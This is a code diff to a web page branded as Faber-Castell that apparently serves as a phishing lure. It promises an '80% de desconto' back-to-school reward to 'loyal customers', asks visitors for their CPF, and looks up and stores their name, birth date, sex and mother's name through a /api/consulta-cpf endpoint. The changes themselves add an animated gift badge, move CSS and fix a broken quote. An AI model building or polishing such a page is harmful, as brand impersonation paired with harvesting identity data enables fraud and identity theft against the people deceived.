@@ -63,22 +63,13 @@
       justify-content:center;
       padding: 0 12px;
     }
-    .brand{
-      color:#fff;
-      text-align:center;
-      user-select:none;
-      line-height:1.05;
-    }
-    .brand .brand-name{
-      font-weight:700;
-      letter-spacing: clamp(1px, .35vw, 2px);
-      font-size:var(--brand-name);
-    }
-    .brand .brand-sub{
-      font-style:italic;
-      margin-top:8px;
-      opacity:.92;
-      font-size:var(--brand-sub);
+
+    /* LOGO NO HEADER */
+    .brand-logo{
+      height: clamp(34px, 6vw, 54px);
+      width: auto;
+      display: block;
+      user-select: none;
     }
 
     /* CONTAINER */
@@ -196,15 +187,6 @@
       cursor:pointer;
     }
 
-    /* LOGO NO HEADER */
-    .brand-logo{
-    height: clamp(34px, 6vw, 54px);
-    width: auto;
-    display: block;
-    user-select: none;
-   }
-
-
     /* TELA 2: RESUMO */
     .summary{
       max-width:640px;
@@ -220,8 +202,12 @@
       margin-bottom: clamp(10px, 2vw, 14px);
       text-align:left;
     }
+
+    /* ✅ AVISO (com presente animado) */
     .badge{
-      display:inline-block;
+      display:inline-flex;
+      align-items:center;
+      gap:10px;
       margin-top:10px;
       background:#fff3cd;
       border:2px solid #ffe08a;
@@ -231,6 +217,29 @@
       font-weight:700;
       font-size: clamp(13px, 2.2vw, 16px);
       line-height:1.35;
+    }
+
+    .gift{
+      display:inline-flex;
+      align-items:center;
+      justify-content:center;
+      width: 30px;
+      height: 30px;
+      font-size: 20px;
+      transform-origin: 50% 60%;
+      animation: giftFloat 2.6s ease-in-out infinite;
+      filter: drop-shadow(0 2px 6px rgba(0,0,0,.15));
+    }
+
+    @keyframes giftFloat{
+      0%   { transform: translateY(0) rotate(0deg) scale(1); }
+      50%  { transform: translateY(-4px) rotate(-2deg) scale(1.03); }
+      100% { transform: translateY(0) rotate(0deg) scale(1); }
+    }
+
+    /* respeita acessibilidade */
+    @media (prefers-reduced-motion: reduce){
+      .gift{ animation: none; }
     }
 
     .grid{
@@ -310,11 +319,10 @@
     Seu navegador não suporta o elemento de áudio.
   </audio>
 
-
   <!-- HEADER -->
-<header class="topbar">
-  <img class="brand-logo" src="/images/logo-fabercastell.png" alt="Faber-Castell">
-</header>
+  <header class="topbar">
+    <img class="brand-logo" src="/images/logo-fabercastell.png" alt="Faber-Castell">
+  </header>
 
   <main class="wrap">
     <!-- TELA 1: LOGIN -->
@@ -350,7 +358,7 @@
 
       <div class="below">
         <h2>Ainda não possui cadastro?</h2>
-        <button class="btn-outline" type="button" onclick="alert('Promoção válida somente para clientes.''">
+        <button class="btn-outline" type="button" onclick="alert('Promoção válida somente para clientes.')">
           Crie sua conta
         </button>
       </div>
@@ -360,7 +368,12 @@
     <section id="screen-summary" style="display:none;">
       <div class="summary">
         <h1>Resumo do cadastro</h1>
-        <div class="badge">🎉 Você recebeu <b>80% de desconto</b> na Promoção de Volta às Aulas por ser um cliente fiel.</div>
+
+        <!-- ✅ AVISO COM PRESENTE ANIMADO -->
+        <div class="badge">
+          <span class="gift" aria-hidden="true">🎁</span>
+          <span>🎉 Você recebeu <b>80% de desconto</b> na Promoção de Volta às Aulas por ser um cliente fiel.</span>
+        </div>
 
         <div class="grid" id="summaryGrid"></div>
 
@@ -473,18 +486,11 @@
       localStorage.setItem("nome_mae", payload.nome_mae);
     }
 
-    /**
-     * ✅ ESTA FUNÇÃO AGORA CONSULTA DE VERDADE:
-     * Ela chama o SEU endpoint /api/consulta-cpf, que precisa devolver:
-     * - inválido: 422 + { valid:false, message:"CPF inválido" }
-     * - válido:   200 + { valid:true, data:{cpf,nome,nascimento,sexo,nome_mae} }
-     */
     async function consultarCpfNoSeuBackend(cpfDigits){
       const url = `/api/consulta-cpf?cpf=${encodeURIComponent(cpfDigits)}`;
       const r = await fetch(url, { method:"GET", headers:{ "Accept":"application/json" } });
       const j = await r.json().catch(() => ({}));
 
-      // debug (você pode tirar depois)
       console.log("Resposta /api/consulta-cpf:", j);
 
       if (!r.ok || j?.valid === false){
@@ -494,7 +500,6 @@
         throw err;
       }
 
-      // normaliza formatos comuns (caso seu backend retorne variações)
       const raw = j?.data?.data || j?.data || j;
 
       return {
@@ -515,7 +520,6 @@
       const cpfDigits = onlyDigits(raw);
 
       if (isEmail){
-        // Se quiser bloquear email e aceitar só CPF, é só remover este bloco.
         const dados = { cpf:"", cpfFormatado:"", nome: raw, nascimento:"", sexo:"", nome_mae:"" };
         salvarNoLocalStorage(dados);
         renderSummary(dados);
@@ -535,7 +539,6 @@
       try{
         const dados = await consultarCpfNoSeuBackend(cpfDigits);
 
-        // ✅ se a API voltar vazio, trata como inválido
         if (!dados?.nome){
           throw new Error("CPF inválido. Verifique e tente novamente.");
         }
